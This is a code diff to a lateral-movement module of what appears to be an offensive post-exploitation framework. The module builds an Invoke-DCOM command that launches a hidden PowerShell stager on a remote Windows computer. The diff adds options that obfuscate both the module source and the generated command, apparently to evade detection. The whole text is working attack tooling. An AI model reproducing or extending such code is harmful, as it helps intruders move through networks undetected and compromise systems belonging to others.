@@ -83,7 +83,7 @@ class Module:
                 self.options[option]['Value'] = value
 
 
-    def generate(self):
+    def generate(self, obfuscate=False, obfuscationCommand=""):
         
         listenerName = self.options['Listener']['Value']
         method = self.options['Method']['Value']
@@ -93,7 +93,9 @@ class Module:
         proxyCreds = self.options['ProxyCreds']['Value']
 
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-DCOM.ps1"
-
+        if obfuscate:
+            helpers.obfuscate_module(moduleSource=moduleSource, obfuscationCommand=obfuscationCommand)
+            moduleSource = moduleSource.replace("module_source", "obfuscated_module_source")
         try:
             f = open(moduleSource, 'r')
         except:
@@ -124,9 +126,11 @@ class Module:
             else:
 
                 stagerCmd = '%COMSPEC% /C start /b C:\\Windows\\System32\\WindowsPowershell\\v1.0\\' + launcher
-                script += "Invoke-DCOM -ComputerName %s -Method %s -Command '%s'" % (computerName, method, stagerCmd)
+                scriptEnd = "Invoke-DCOM -ComputerName %s -Method %s -Command '%s'" % (computerName, method, stagerCmd)
 
 
-        script += "| Out-String | %{$_ + \"`n\"};"
-
+        scriptEnd += "| Out-String | %{$_ + \"`n\"};"
+        if obfuscate:
+            scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
+        script += scriptEnd
         return script
